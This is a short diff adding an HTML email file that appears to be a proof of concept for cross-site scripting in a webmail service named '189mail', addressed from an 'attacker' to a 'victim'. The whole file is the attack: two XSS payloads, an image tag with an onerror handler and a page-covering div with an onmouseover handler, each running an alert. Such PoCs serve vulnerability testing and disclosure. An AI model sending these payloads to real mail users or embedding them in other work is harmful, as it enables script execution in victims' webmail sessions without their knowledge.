@@ -1,0 +1,8 @@
+From: <attacker@attacker.com>
+Subject: 189mail XSS
+To: victim@189.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<img/src=x onerror=alert(/img/)>
+<div/onmouseover=alert(/div/) style="position:absolute;top:0;left:0;width:100%;height:100%">
